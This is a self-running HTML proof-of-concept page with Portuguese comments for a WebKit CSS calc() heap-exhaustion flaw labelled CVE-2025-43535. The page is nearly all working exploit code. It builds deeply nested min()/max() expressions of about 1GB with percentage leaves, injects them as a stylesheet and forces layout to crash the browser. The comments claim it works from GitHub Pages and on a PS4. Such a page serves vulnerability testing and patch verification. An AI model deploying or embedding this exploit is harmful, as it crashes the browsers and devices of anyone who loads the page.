<!DOCTYPE html>
<!--
  PoC FINAL: CVE-2025-43535
  WebKit CSS Math — CSSCalcValue heap exhaustion

  POR QUE 1px/2px NÃO FUNCIONOU:
  ════════════════════════════════════════════════════════════
  min(1px, 2px) = 1px em PARSE TIME — ambas são unidades
  absolutas. WebKit resolve e descarta a árvore imediatamente.
  Zero objetos CSSCalcValue criados. Zero pressão.

  SOLUÇÃO — FOLHAS COM UNIDADES RELATIVAS (%):
  ════════════════════════════════════════════════════════════
  min(1%, 2%) NÃO pode ser resolvido sem contexto de layout.
  O WebKit cria os 122M objetos CSSCalcValue e mantém na
  memória até a chamada de offsetWidth resolvê-los.
  Em offsetWidth: 122M objetos no heap C++ → OOM → crash.

  Mesmo mecanismo do Blob (que crashou localmente),
  mas o crash ocorre em offsetWidth em vez do carregamento.
  Resultado idêntico. Funciona no GitHub Pages (sem blob:).

  ESTRUTURA (1044MB, 122M nós):
  ════════════════════════════════════════════════════════════
  max(                              ← raiz usa max() para
    sym(10, '1%'),                    garantir avaliação
    min(                              de ambos os ramos
      sym(9,  '2%'),
      min(
        sym(8, '1%'),
        sym(6, '2%')
      )
    )
  )

  JS heap: cA(576KB) + cB(576KB) + arrays ≈ 1.2MB
  Sem blob: URL · Sem SW · GitHub Pages ✓ · PS4 ✓
-->
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace;
         padding:16px; margin:0; font-size:13px; }
  #log { background:#111; border:1px solid #2a4a2a; padding:10px;
         height:72vh; overflow-y:auto; font-size:11px; line-height:1.7; }
  .ok    { color:#00ff88 }
  .fail  { color:#ff4444 }
  .info  { color:#ffcc44 }
  .warn  { color:#ff8844 }
  .crash { color:#ff44ff; font-weight:bold }
  .dim   { color:#336633 }
  .bar   { background:#0a1a0a; border:1px solid #1a3a1a; color:#44aa44;
           padding:6px 10px; margin-bottom:8px; font-size:11px; }
</style>
</head>
<body>
<div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
  CVE-2025-43535 · folhas % · JS~1.2MB · sem blob · GitHub/PS4
</div>
<div class="bar" id="bar">Aguardando...</div>
<div id="log"></div>

<!-- Container com tamanho definido — necessário para % ser não-zero -->
<div id="stage" style="position:absolute;top:-9999px;left:-9999px;
                       width:500px;height:500px;overflow:hidden">
  <div id="target" style="position:absolute;visibility:hidden"></div>
</div>

<script>
"use strict";

var logEl  = document.getElementById('log');
var barEl  = document.getElementById('bar');
var target = document.getElementById('target');

function L(m, c) {
  logEl.innerHTML += '<div class="'+(c||'dim')+'">' + m + '</div>';
  logEl.scrollTop = logEl.scrollHeight;
}
function bar(m) { barEl.textContent = m; }

// ─────────────────────────────────────────────────────────────
// Constrói c16 com folha relativa.
// '1%' e '2%' = unidades relativas → não resolvíveis em parse time
// ─────────────────────────────────────────────────────────────
function buildDepth(depth, leaf) {
  var e = leaf;
  for (var d = 1; d <= depth; d++) {
    var n = 'min(' + e + ',' + e + ')';
    e = null; e = n;
  }
  return e;
}

// ─────────────────────────────────────────────────────────────
// insertSym: insere árvore simétrica via TextNodes.
// levels de recursão → sem stack overflow (max 10).
// ─────────────────────────────────────────────────────────────
function insertSym(parent, levels, leaf) {
  if (levels === 0) {
    parent.appendChild(document.createTextNode(leaf));
    return;
  }
  parent.appendChild(document.createTextNode('min('));
  insertSym(parent, levels - 1, leaf);
  parent.appendChild(document.createTextNode(','));
  insertSym(parent, levels - 1, leaf);
  parent.appendChild(document.createTextNode(')'));
}

function run() {
  L('CVE-2025-43535 · folhas % · sem constant-fold', 'info');
  L('Crash ocorre em offsetWidth (não no parse) — mesma OOM', 'info');
  L('', '');

  // ── 1: construir cA='1%' e cB='2%' (576KB cada) ──────────
  bar('[1/4] Construindo cA(1%) e cB(2%)...');
  L('[1/4] buildDepth(16, "1%") e buildDepth(16, "2%")...', 'warn');

  setTimeout(function() {

    var cA, cB;
    try {
      cA = buildDepth(16, '1%');
      cB = buildDepth(16, '2%');
      L('[1/4] cA: ' + (cA.length/1024).toFixed(0) + 'KB (1%) ✓', 'ok');
      L('[1/4] cB: ' + (cB.length/1024).toFixed(0) + 'KB (2%) ✓', 'ok');
    } catch(e) {
      L('[1/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
    }

    // ── 2: montar <style> offline com TextNodes ───────────────
    bar('[2/4] Inserindo TextNodes (1044MB)...');
    L('[2/4] max(sym10_1%, min(sym9_2%, min(sym8_1%, sym6_2%)))...', 'warn');
    L('[2/4] % = não-resolvível em parse time → 122M CSSCalcValue pendentes', 'info');

    setTimeout(function() {

      var styleEl = document.createElement('style');

      try {
        styleEl.appendChild(document.createTextNode('#target{width:'));

        // Raiz: max() para forçar avaliação de ambos os ramos
        // (max precisa comparar → não pode descartar nenhum)
        styleEl.appendChild(document.createTextNode('max('));

          // ramo esquerdo: sym(10, cA) = 576MB com folha '1%'
          insertSym(styleEl, 10, cA);

          styleEl.appendChild(document.createTextNode(','));

          // ramo direito: min(sym9_B, min(sym8_A, sym6_B))
          styleEl.appendChild(document.createTextNode('min('));
            insertSym(styleEl, 9, cB);           // 288MB '2%'
            styleEl.appendChild(document.createTextNode(','));
            styleEl.appendChild(document.createTextNode('min('));
              insertSym(styleEl, 8, cA);          // 144MB '1%'
              styleEl.appendChild(document.createTextNode(','));
              insertSym(styleEl, 6, cB);          //  36MB '2%'
            styleEl.appendChild(document.createTextNode(')'));
          styleEl.appendChild(document.createTextNode(')'));

        styleEl.appendChild(document.createTextNode(')}'));

        var nodeCount = styleEl.childNodes.length;
        L('[2/4] ' + nodeCount + ' TextNodes ✓', 'ok');

        // Liberar strings do JS heap — TextNodes têm cópias
        cA = null; cB = null;
        L('[2/4] cA e cB liberados ✓', 'ok');

      } catch(e) {
        cA = null; cB = null;
        L('[2/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
      }

      // ── 3: conectar ao DOM ────────────────────────────────
      bar('[3/4] Conectando ao DOM...');
      L('[3/4] appendChild → CSS parser indexa 1044MB...', 'warn');
      L('[3/4] (crash aqui ou em offsetWidth — ambos = CVE presente)', 'crash');

      setTimeout(function() {
        try {
          document.head.appendChild(styleEl);
          L('[3/4] Stylesheet conectada ✓', 'ok');
        } catch(e) {
          L('[3/4] ' + e, 'fail');
        }

        // ── 4: forçar layout — ponto do crash ─────────────────
        bar('[4/4] offsetWidth — 122M objetos sendo criados...');
        L('[4/4] TRIGGER: offsetWidth força resolução de 1044MB de %...', 'warn');
        L('[4/4] ◀◀ SE O BROWSER FECHAR AQUI: CRASH = CVE PRESENTE ▶▶', 'crash');

        setTimeout(function() {
          try {
            void target.offsetWidth;
            var w = window.getComputedStyle(target).getPropertyValue('width');
            L('[4/4] width="' + w + '" ✓', 'ok');
          } catch(e) {
            L('[4/4] exceção: ' + e, 'fail');
          }

          try { document.head.removeChild(styleEl); } catch(e) {}

          L('', '');
          L('═══════════════════════════════════════', 'warn');
          L('CRASH = CVE-2025-43535 PRESENTE', 'crash');
          L('SEM CRASH = PATCHED', 'ok');
          L('═══════════════════════════════════════', 'warn');
          bar('DONE');
        }, 50);
      }, 50);
    }, 80);
  }, 100);
}

window.addEventListener('load', function() { setTimeout(run, 200); });
</script>
</body>
</html>
